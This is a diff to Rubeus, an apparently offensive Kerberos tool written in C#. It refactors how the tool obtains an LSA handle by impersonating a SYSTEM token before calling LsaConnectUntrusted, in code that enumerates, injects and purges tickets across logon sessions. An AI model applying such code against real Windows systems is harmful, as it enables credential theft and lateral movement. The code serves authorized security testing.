@@ -54,66 +54,30 @@ namespace Rubeus
             public KRB_CRED KrbCred;
         }
 
-        public static IntPtr LsaRegisterLogonProcessHelper()
+        public static IntPtr GetLsaHandle(bool elevateToSystem = true)
         {
-            // helper that establishes a connection to the LSA server and verifies that the caller is a logon application
-            //  used for Kerberos ticket enumeration for ALL users
+            // returns a handle to LSA via LsaConnectUntrusted(), elevating to SYSTEM first
+            //  if we're high integrity so we have trusted access
+            IntPtr lsaHandle = IntPtr.Zero;
 
-            var logonProcessName = "User32LogonProcesss"; // yes I know this is "weird" ;)
-            Interop.LSA_STRING_IN LSAString;
-            var lsaHandle = IntPtr.Zero;
-            UInt64 securityMode = 0;
-
-            LSAString.Length = (ushort)logonProcessName.Length;
-            LSAString.MaximumLength = (ushort)(logonProcessName.Length + 1);
-            LSAString.Buffer = logonProcessName;
-
-            var ret = Interop.LsaRegisterLogonProcess(ref LSAString, out lsaHandle, out securityMode);
-
-            return lsaHandle;
-        }
-
-        public static IntPtr GetLsaHandle()
-        {
-            // returns a handle to LSA
-            //  uses LsaConnectUntrusted() if not in high integrity
-            //  uses LsaRegisterLogonProcessHelper() if in high integrity
-
-            IntPtr lsaHandle;
-
-            if (!Helpers.IsHighIntegrity())
+            if (Helpers.IsHighIntegrity() && elevateToSystem)
             {
-                int retCode = Interop.LsaConnectUntrusted(out lsaHandle);
-            }
-
-            else
-            {
-                lsaHandle = LsaRegisterLogonProcessHelper();
-
-                // if the original call fails then it is likely we don't have SeTcbPrivilege
-                // to get SeTcbPrivilege we can Impersonate a NT AUTHORITY\SYSTEM Token
-                if (lsaHandle == IntPtr.Zero)
+                if (!Helpers.IsSystem())
                 {
-                    var currentName = WindowsIdentity.GetCurrent().Name;
-
-                    if (Helpers.IsSystem())
+                    // elevated but not SYSTEM, so gotta GetSystem() first
+                    if (!Helpers.GetSystem())
                     {
-                        // if we're already SYSTEM, we have the proper privilegess to get a Handle to LSA with LsaRegisterLogonProcessHelper
-                        lsaHandle = LsaRegisterLogonProcessHelper();
+                        throw new Exception("Could not elevate to system");
                     }
                     else
                     {
-                        // elevated but not system, so gotta GetSystem() first
-                        if (!Helpers.GetSystem())
-                        {
-                            throw new Exception("Could not elevate to system");
-                        }
-                        // should now have the proper privileges to get a Handle to LSA
-                        lsaHandle = LsaRegisterLogonProcessHelper();
-                        // we don't need our NT AUTHORITY\SYSTEM Token anymore so we can revert to our original token
+                        int retCode = Interop.LsaConnectUntrusted(out lsaHandle);
                         Interop.RevertToSelf();
                     }
                 }
+            }
+            else {
+                int retCode = Interop.LsaConnectUntrusted(out lsaHandle);
             }
 
             return lsaHandle;
@@ -434,7 +398,7 @@ namespace Rubeus
 
                     sessionCreds.Add(sessionCred);
                 }
-                // disconnect from LSA
+
                 Interop.LsaDeregisterLogonProcess(lsaHandle);
 
                 return sessionCreds;
@@ -1052,7 +1016,7 @@ namespace Rubeus
             // straight from Vincent LE TOUX' work
             //  https://github.com/vletoux/MakeMeEnterpriseAdmin/blob/master/MakeMeEnterpriseAdmin.ps1#L2925-L2971
 
-            var LsaHandle = IntPtr.Zero;
+            var lsaHandle = GetLsaHandle();
             int AuthenticationPackage;
             int ntstatus, ProtocalStatus;
 
@@ -1063,28 +1027,6 @@ namespace Rubeus
                     Console.WriteLine("[X] You need to be in high integrity to apply a ticket to a different logon session");
                     return;
                 }
-                else
-                {
-                    if (Helpers.IsSystem())
-                    {
-                        // if we're already SYSTEM, we have the proper privilegess to get a Handle to LSA with LsaRegisterLogonProcessHelper
-                        LsaHandle = LsaRegisterLogonProcessHelper();
-                    }
-                    else
-                    {
-                        // elevated but not system, so gotta GetSystem() first
-                        Helpers.GetSystem();
-                        // should now have the proper privileges to get a Handle to LSA
-                        LsaHandle = LsaRegisterLogonProcessHelper();
-                        // we don't need our NT AUTHORITY\SYSTEM Token anymore so we can revert to our original token
-                        Interop.RevertToSelf();
-                    }
-                }
-            }
-            else
-            {
-                // otherwise use the unprivileged connection with LsaConnectUntrusted
-                ntstatus = Interop.LsaConnectUntrusted(out LsaHandle);
             }
 
             var inputBuffer = IntPtr.Zero;
@@ -1097,7 +1039,7 @@ namespace Rubeus
                 LSAString.Length = (ushort)Name.Length;
                 LSAString.MaximumLength = (ushort)(Name.Length + 1);
                 LSAString.Buffer = Name;
-                ntstatus = Interop.LsaLookupAuthenticationPackage(LsaHandle, ref LSAString, out AuthenticationPackage);
+                ntstatus = Interop.LsaLookupAuthenticationPackage(lsaHandle, ref LSAString, out AuthenticationPackage);
                 if (ntstatus != 0)
                 {
                     var winError = Interop.LsaNtStatusToWinError((uint)ntstatus);
@@ -1120,7 +1062,7 @@ namespace Rubeus
                 inputBuffer = Marshal.AllocHGlobal(inputBufferSize);
                 Marshal.StructureToPtr(request, inputBuffer, false);
                 Marshal.Copy(ticket, 0, new IntPtr(inputBuffer.ToInt64() + request.KerbCredOffset), ticket.Length);
-                ntstatus = Interop.LsaCallAuthenticationPackage(LsaHandle, AuthenticationPackage, inputBuffer, inputBufferSize, out ProtocolReturnBuffer, out ReturnBufferLength, out ProtocalStatus);
+                ntstatus = Interop.LsaCallAuthenticationPackage(lsaHandle, AuthenticationPackage, inputBuffer, inputBufferSize, out ProtocolReturnBuffer, out ReturnBufferLength, out ProtocalStatus);
                 if (ntstatus != 0)
                 {
                     var winError = Interop.LsaNtStatusToWinError((uint)ntstatus);
@@ -1141,7 +1083,8 @@ namespace Rubeus
             {
                 if (inputBuffer != IntPtr.Zero)
                     Marshal.FreeHGlobal(inputBuffer);
-                Interop.LsaDeregisterLogonProcess(LsaHandle);
+
+                Interop.LsaDeregisterLogonProcess(lsaHandle);
             }
         }
 
@@ -1164,7 +1107,6 @@ namespace Rubeus
                     Console.WriteLine("[X] You need to be in high integrity to purge tickets from a different logon session");
                     return;
                 }
-
             }
 
             var inputBuffer = IntPtr.Zero;
@@ -1219,6 +1161,7 @@ namespace Rubeus
             {
                 if (inputBuffer != IntPtr.Zero)
                     Marshal.FreeHGlobal(inputBuffer);
+
                 Interop.LsaDeregisterLogonProcess(lsaHandle);
             }
         }
